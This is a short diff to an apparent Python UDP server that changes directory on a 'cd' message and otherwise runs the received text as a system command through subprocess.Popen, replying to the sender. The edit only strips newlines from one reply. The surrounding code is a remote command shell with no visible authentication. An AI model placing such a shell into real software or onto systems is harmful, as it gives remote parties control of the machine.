@@ -133,7 +133,7 @@ def RunServer(host):
                 cleanData = data.split(' ')
                 if (cleanData[0] == 'cd'):
                     os.chdir(cleanData[1])
-                    UDPServerSocket.sendto(os.getcwd().encode('utf-8'), addr)
+                    UDPServerSocket.sendto(os.getcwd(). rstrip("\n").encode('utf-8'), addr)
                 else:
                     result, err = subprocess.Popen(cleanData,
                                               stderr=subprocess.PIPE,
